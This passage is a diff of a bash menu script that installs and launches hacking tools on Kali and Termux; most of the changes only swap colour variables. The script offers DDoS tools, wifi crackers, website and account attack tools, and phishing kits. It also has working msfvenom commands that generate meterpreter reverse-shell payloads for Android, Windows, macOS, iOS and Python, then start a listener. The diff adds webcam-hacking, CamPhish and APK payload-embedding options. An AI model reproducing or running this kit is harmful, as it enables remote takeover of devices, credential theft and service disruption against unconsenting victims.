 figlet "change stayle"
 cd $HOME
 apt install figlet -y
@@ -739,7 +1032,7 @@ fi
 if [ $other = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "lxde"
 cd ~
 apt-get install xterm
@@ -749,7 +1042,7 @@ fi
 if [ $other = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "wireshark"
 cd ~
 apt-get install wireshark
@@ -758,7 +1051,7 @@ fi
 if [ $other = 6 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "nano"
 cd ~
 apt-get install nano -y
@@ -774,23 +1067,23 @@ if [ $name = 2 ]
 then
 clear
 head
-echo -e $red "Termux"
+echo -e $green "Termux"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " DDOS Attack"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Sniffing"
+echo -e $green '{ -2- } ===> ' $green " Sniffing"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Wifi Hack"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " webSite Hack"
+echo -e $green '{ -4- } ===> ' $green " webSite Hack"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Accounts Hack"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " creat Backup"
+echo -e $green '{ -6- } ===> ' $green " creat Backup"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " injection payload"
 echo ""
-echo -e $green '{ -8- } ===> ' $red " other"
+echo -e $green '{ -8- } ===> ' $green " other"
 echo ""
 echo -e $green "00- back"
 echo ""
@@ -799,11 +1092,11 @@ if [ $termux = 1 ]
 then
 clear
 head
-echo -e $red "DDOS Attack"
+echo -e $green "DDOS Attack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Slowloris"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Hammer"
+echo -e $green '{ -2- } ===> ' $green " Hammer"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Metasploit"
 echo ""
@@ -813,7 +1106,7 @@ read -p " insert : " ddos_termux
 if [ $ddos_termux = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "slowloris"
 cd ~
 git clone https://github.com/gkbrk/slowloris.git
@@ -821,7 +1114,7 @@ fi
 if [ $ddos_termux = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Hammer"
 cd ~
 git clone https://github.com/cyweb/hammer.git
@@ -829,7 +1122,7 @@ fi
 if [ $ddos_termux = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "metasploit"
 cd ~
 apt install git wget curl
@@ -854,22 +1147,22 @@ if [ $termux = 2 ]
 then
 clear
 head
-echo -e $red "Sniffing"
+echo -e $green "Sniffing"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Websploit"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Routersploit"
+echo -e $green '{ -2- } ===> ' $green " Routersploit"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Metasploit"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " BeEF"
+echo -e $green '{ -4- } ===> ' $green " BeEF"
 echo ""
 echo -e $green "00- Back"
 read -p " insert : " ter_sniffing
 if [ $ter_sniffing = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Websploit"
 cd ~
 pkg install python2
@@ -880,7 +1173,7 @@ fi
 if [ $ter_sniffing = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Routersploit"
 cd ~
 git clone https://github.com/reverse-shell/routersploit
@@ -900,14 +1193,14 @@ if [ $ter_sniffing = 4 ]
 then
 clear
 head
-echo -e $red "BEeF"
+echo -e $green "BEeF"
 echo ""
 echo -e $yellow "Note : before any thing copy this code to your terminal dpkg --print-architecture"
 echo ""
 echo ""
 echo -e $green '{ -1- } ===> ' $white " _aarch64/armv8/armv8l/arm64_"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " _armhf/armv7l/arm/arm5vl_"
+echo -e $green '{ -2- } ===> ' $green " _armhf/armv7l/arm/arm5vl_"
 echo ""
 echo -e $green "00- back"
 echo ""
@@ -966,19 +1259,19 @@ then
 clear
 
 head
-echo -e $red "Wifi Hack"
+echo -e $green "Wifi Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Wifite"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " wifite2"
+echo -e $green '{ -2- } ===> ' $green " wifite2"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " HT-WPS-Breaker"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " fluxion"
+echo -e $green '{ -4- } ===> ' $green " fluxion"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Routersploit"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " airgeddon"
+echo -e $green '{ -6- } ===> ' $green " airgeddon"
 echo ""
 echo -e $green '{ -7- } ===> ' $white "M-Info list password"
 echo ""
@@ -988,7 +1281,7 @@ read -p " insert : " wifi2
 if [ $wifi2 = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "wifite"
 cd ~
 wget https://raw.github.com/derv82/wifite/master/wifite.py
@@ -997,7 +1290,7 @@ fi
 if [ $wifi2 = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "wifite2"
 cd ~
 git clone https://github.com/derv82/wifite2.git
@@ -1006,7 +1299,7 @@ fi
 if [ $wifi2 = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "HT-WPS-Breaker"
 cd ~
 git clone https://github.com/SilentGhostX/HT-WPS-Breaker
@@ -1015,7 +1308,7 @@ fi
 if [ $wifi2 = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "fluxion"
 cd ~
 git clone https://github.com/facebook/flux.git
@@ -1024,7 +1317,7 @@ fi
 if [ $wifi2 = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "RouterSploit"
 cd ~
 git clone https://github.com/reverse-shell/routersploit
@@ -1033,7 +1326,7 @@ fi
 if [ $wifi2 = 6 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "airgeddon"
 cd ~
 git clone https://github.com/v1s1t0r1sh3r3/airgeddon
@@ -1042,7 +1335,7 @@ fi
 if [ $wifi2 = 7 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "M-Info Word list"
 pip install wordlist
 fi
@@ -1056,39 +1349,39 @@ if [ $termux = 4 ]
 then
 clear
 head
-echo -e $red "WebSite Hack"
+echo -e $green "WebSite Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Sqlmap"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " webscan"
+echo -e $green '{ -2- } ===> ' $green " webscan"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Xshell"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " scriptux"
+echo -e $green '{ -4- } ===> ' $green " scriptux"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Sitebroker"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " nmap"
+echo -e $green '{ -6- } ===> ' $green " nmap"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " Devploit"
 echo ""
-echo -e $green '{ -8- } ===> ' $red " Iplocator"
+echo -e $green '{ -8- } ===> ' $green " Iplocator"
 echo ""
 echo -e $green '{ -9- } ===> ' $white " sniper-h"
 echo ""
-echo -e $green '{ -10- } ===> ' $red " hash-identifier"
+echo -e $green '{ -10- } ===> ' $green " hash-identifier"
 echo ""
 echo -e $green '{ -11- } ===> ' $white " dirsearch"
 echo ""
-echo -e $green '{ -12- } ===> ' $red " Google-Dork-Scan"
+echo -e $green '{ -12- } ===> ' $green " Google-Dork-Scan"
 echo ""
 echo -e $green '{ -13- } ===> ' $white " admin-panel-finder"
 echo ""
-echo -e $green '{ -14- } ===> ' $red " XSStrike"
+echo -e $green '{ -14- } ===> ' $green " XSStrike"
 echo ""
 echo -e $green '{ -15- } ===> ' $white " XAttacker"
 echo ""
-echo -e $green '{ -16- } ===> ' $red " OWScan"
+echo -e $green '{ -16- } ===> ' $green " OWScan"
 echo ""
 echo -e $green "00- Back "
 echo ""
@@ -1096,7 +1389,7 @@ read -p " insert : " ter_website
 if [ $ter_website = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Sqlmap"
 cd ~
 git clone https://github.com/sqlmapproject/sqlmap
@@ -1105,7 +1398,7 @@ fi
 if [ $ter_website = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "webscan"
 cd ~
 git clone https://github.com/kost/docker-webscan
@@ -1114,7 +1407,7 @@ fi
 if [ $ter_website = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Xshell"
 cd ~
 git clone https://github.com/Ubaii/Xshell
@@ -1123,7 +1416,7 @@ fi
 if [ $ter_website = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "scriptux"
 cd ~
 git clone https://github.com/Gameye98/Scriptux
@@ -1132,7 +1425,7 @@ fi
 if [ $ter_website = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "sitebrokler"
 cd ~
 git clone https://github.com/Anon-Exploiter/SiteBroker
@@ -1141,7 +1434,7 @@ fi
 if [ $ter_website = 6 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "nmap"
 apt install nmap
 bash Tools-Hk.sh
@@ -1149,7 +1442,7 @@ fi
 if [ $ter_website = 7 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Devploit"
 git clone https://github.com/joker25000/Devploit
 bash Tools-Hk.sh
@@ -1157,7 +1450,7 @@ fi
 if [ $yer_website = 8 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "IPlocator"
 cd ~
 git clone https://github.com/AndreasBriese/ipLocator
@@ -1166,7 +1459,7 @@ fi
 if [ $ter_website = 9 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "sniper-h"
 git clone https://github.com/laser010/sniper-h
 bash Tools-Hk.sh
@@ -1174,7 +1467,7 @@ fi
 if [ $ter_website = 10 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "hash-identifier"
 git clone https://github.com/Miserlou/Hash-Identifier
 bash Tools-Hk.sh
@@ -1182,7 +1475,7 @@ fi
 if [ $ter_website = 11 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "dirsearch"
 cd ~
 git clone https://github.com/maurosoria/dirsearch
@@ -1191,7 +1484,7 @@ fi
 if [ $ter_website = 12 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Google-Dork-Scan"
 cd ~
 git clone https://github.com/ReiGelado/Google-Dork-scan
@@ -1200,7 +1493,7 @@ fi
 if [ $ter_website = 13 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "admin-panel-finder"
 cd ~
 git clone https://github.com/bdblackhat/admin-panel-finder
@@ -1209,7 +1502,7 @@ fi
 if [ $ter_website = 14 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "XSStrike"
 cd ~
 git clone https://github.com/UltimateHackers/XSStrike
@@ -1218,7 +1511,7 @@ fi
 if [ $ter_website = 15 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "XAttacker"
 cd ~
 git clone https://github.com/Moham3dRiahi/XAttacker
@@ -1227,7 +1520,7 @@ fi
 if [ $ter_website = 16 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "OWScan"
 cd ~
 git clone https://github.com/Gameye98/OWScan
@@ -1236,7 +1529,7 @@ fi
 if [ $ter_website = 00 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "back"
 bash Tools-Hk.sh
 fi
@@ -1245,15 +1538,15 @@ if [ $termux = 5 ]
 then
 clear
 head
-echo -e $red "Account Hack"
+echo -e $green "Account Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " hydra"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " weeman"
+echo -e $green '{ -2- } ===> ' $green " weeman"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " crunch (wordlist)"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " socialfish"
+echo -e $green '{ -4- } ===> ' $green " socialfish"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Hunner"
 echo ""
@@ -1263,7 +1556,7 @@ read -p " insert : "  hackacc
 if [ $hackacc = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Hydra"
 pkg install hydra
 bash Tools-Hk.sh
@@ -1271,7 +1564,7 @@ fi
 if [ $hackacc = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "weeman"
 git clone https://github.com/evait-security/weeman.git
 bash Tools-Hk.sh
@@ -1279,7 +1572,7 @@ fi
 if [ $hackacc = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "crunch"
 git clone https://github.com/KURO-CODE/Crunch-Cracker.git
 bash Tools-Hk.sh
@@ -1287,7 +1580,7 @@ fi
 if [ $hackacc = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "socialfish"
 git clone https://github.com/UndeadSec/SocialFish
 bash Tools-Hk.sh
@@ -1295,7 +1588,7 @@ fi
 if [ $hackacc = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Hunner"
 git clone https://github.com/b3-v3r/Hunner.git
 bash Tools-Hk.sh
@@ -1310,11 +1603,11 @@ if [ $termux = 6 ]
 then
 clear
 head
-echo -e $red "Backup / Recovery"
+echo -e $green "Backup / Recovery"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Backup"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Recovery"
+echo -e $green '{ -2- } ===> ' $green " Recovery"
 echo ""
 echo -e $green "00- Back"
 echo ""
@@ -1322,7 +1615,7 @@ read -p " insert : " backup_recovery2
 if [ $backup_recovery2 = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "backup"
 cd ~
 apt update && apt upgrade
@@ -1334,7 +1627,7 @@ fi
 if [ $backup_recovery2 = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Recovery"
 cd ~
 apt update && apt upgrade
@@ -1353,11 +1646,11 @@ if [ $termux = 7 ]
 then
 clear
 head
-echo -e $red   "PAYLOAD"
+echo -e $green   "PAYLOAD"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Tmux-Bunch"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " PAYMAX"
+echo -e $green '{ -2- } ===> ' $green " PAYMAX"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " txtool"
 echo ""
@@ -1367,7 +1660,7 @@ read -p " insert : " payload
 if [ $payload = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Tmux-Bunch"
 cd ~
 git clone https://github.com/Hax4us/Tmux-Bunch
@@ -1376,7 +1669,7 @@ fi
 if [ $payload = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "PAYMAX"
 cd ~
 git clone https://github.com/Matrix07ksa/PAYMAX
@@ -1385,7 +1678,7 @@ fi
 if [ $payload = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Txtool"
 cd ~
 git clone https://github.com/kuburan/txtool
@@ -1406,15 +1699,15 @@ if [ $termux = 8 ]
 then
 clear
 head
-echo -e $red   "Other"
+echo -e $green   "Other"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " spammer-Grab"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Ngrok"
+echo -e $green '{ -2- } ===> ' $green " Ngrok"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " change style"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " root - sudo"
+echo -e $green '{ -4- } ===> ' $green " root - sudo"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " kali Nethunter"
 echo ""
@@ -1424,7 +1717,7 @@ read -p " insert : " other2
 if [ $other2 = 1 ]
 then
 clear
-echo -e $red 
+echo -e $green 
 figlet "spammer-Grab"
 cd ~
 cd $Home
@@ -1441,7 +1734,7 @@ fi
 if [ $other2 = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Ngrok"
 cd $Home
 mv Tools-Hk/ngrok-stable-linux-arm.zip $HOME
@@ -1457,7 +1750,7 @@ fi
 if [ $other2 = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "change stayle"
 cd $HOME
 apt install figlet -y
@@ -1473,7 +1766,7 @@ fi
 if [ $other2 = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "root - sudo"
 cd ~
 apt upgrade -y
@@ -1491,10 +1784,10 @@ if [ $other2 = 5 ]
 then
 clear
 head
-echo -e $red   " install kali Nethunter"
+echo -e $green   " install kali Nethunter"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " no root"
-echo -e $green     '{ -2- } ===> ' $red " root"
+echo -e $green     '{ -2- } ===> ' $green " root"
 echo ""
 echo -e $green     "00- BACK"
 echo ""
@@ -1577,11 +1870,11 @@ if [ $name = 3 ]
 then
 clear
 head
-echo -e $red   "TOOLS"
+echo -e $green   "TOOLS"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Kali Linux"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Termux / Gnuroot"
+echo -e $green '{ -2- } ===> ' $green " Termux / Gnuroot"
 echo ""
 echo ""
 echo -e $green "00- back"
@@ -1591,21 +1884,24 @@ if [ $usetools = 1 ]
 then
 clear
 head
-echo -e $red   "use automatic not command"
+echo -e $green   "use automatic not command"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " injection payloads"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Scan Ip"
+echo -e $green '{ -2- } ===> ' $green " Scan Ip"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " account hack"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " web hack"
+echo -e $green '{ -4- } ===> ' $green " web hack"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Ddos attack"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " scan port"
+echo -e $green '{ -6- } ===> ' $green " scan port"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " wifi"
+echo ""
+echo -e $green '{ -8- } ===> ' $white " Hack IP WebCam With Hydra"
+
 echo ""
 echo ""
 echo -e $green "00- Back "
@@ -1615,13 +1911,15 @@ if [ $kali = 1 ]
 then
 clear
 head
-echo -e $red   "Injection payloads"
+echo -e $green   "Injection payloads"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " msfvenom"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " venom"
+echo -e $green '{ -2- } ===> ' $green " venom"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " PAYMAX"
+echo ""
+echo -e $green '{ -4- } ===> ' $green " CamPhish"
 echo ""
 echo -e $green "00- Back "
 echo ""
@@ -1630,25 +1928,26 @@ if [ $injection_payload = 1 ]
 then
 clear
 head
-echo -e $red   "msfvenom"
+echo -e $green   "msfvenom"
 echo ""
 
-echo -e $green     '{ -1- } ===> ' $white " Payload Android"
-echo -e $green     '{ -2- } ===> ' $red " Payload Windows"
-echo -e $green     '{ -3- } ===> ' $white " Payload Linux"
-echo -e $green     '{ -4- } ===> ' $red " Payload Mac"
-echo -e $green     '{ -5- } ===> ' $white " Payload Ios"
-echo -e $green     '{ -6- } ===> ' $red " Payload Python"
-echo -e $green     '{ -7- } ===> ' $white " Payload url"
-echo -e $green     '{ -8- } ===> ' $red " Payload mp4"
-echo -e $green     '{ -9- } ===> ' $white " Payload Pdf"
+echo -e $green     '{ -1-  } ===> ' $white " Payload Android"
+echo -e $green     '{ -2-  } ===> ' $green " Payload Windows"
+echo -e $green     '{ -3-  } ===> ' $white " Payload Linux"
+echo -e $green     '{ -4-  } ===> ' $green " Payload Mac"
+echo -e $green     '{ -5-  } ===> ' $white " Payload Ios"
+echo -e $green     '{ -6-  } ===> ' $green " Payload Python"
+echo -e $green     '{ -7-  } ===> ' $white " Payload url"
+echo -e $green     '{ -8-  } ===> ' $green " Payload mp4"
+echo -e $green     '{ -9-  } ===> ' $white " Payload Pdf"
+echo -e $green     '{ -10- } ===> ' $white " Embed Payload in Apk"
 echo ""
 
 echo -e $green     "00- BACK"
 echo ""
 echo ""
 echo -e $green     "Enter The Number"
-echo -e $red
+echo -e $green
 read -p " insert : " pa
 if [ $pa = 1 ]
 then
@@ -1660,7 +1959,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1668,7 +1967,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1676,7 +1975,7 @@ echo ""
 echo -e $green "What is Name Payload? "
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1690,7 +1989,7 @@ toilet "Loading" | lolcat
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -1700,7 +1999,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1708,7 +2007,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -1727,7 +2026,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1735,7 +2034,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1743,7 +2042,7 @@ echo ""
 echo -e $green "What is Name Payload?"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 
 read -p " insert : " name
 echo ""
@@ -1758,7 +2057,7 @@ toilet "loading" | lolcat
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $Pathsave/$name.exe
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -1768,7 +2067,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1776,7 +2075,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -1795,7 +2094,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1803,7 +2102,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1811,7 +2110,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1825,7 +2124,7 @@ toilet "Loading" | lolcat
 msfvenom -f raw -p python/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -1835,7 +2134,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1843,7 +2142,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -1863,7 +2162,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1871,7 +2170,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1886,7 +2185,7 @@ toilet "Loading" | lolcat
 msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o $pathsave/$name.macho
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -1896,7 +2195,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1904,7 +2203,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -1923,7 +2222,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~ ~_~_~_~_~_~_~_~_~'
@@ -1933,7 +2232,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~~_~'
@@ -1941,7 +2240,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -1951,12 +2250,12 @@ echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 read -p " insert : " pathsave
 echo ""
-echo -e $red
+echo -e $green
 toilet "Loading" | lolcat
 msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -1966,7 +2265,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -1974,7 +2273,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2001,7 +2300,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2009,7 +2308,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2024,7 +2323,7 @@ toilet "Loading" | lolcat
 msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2034,7 +2333,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
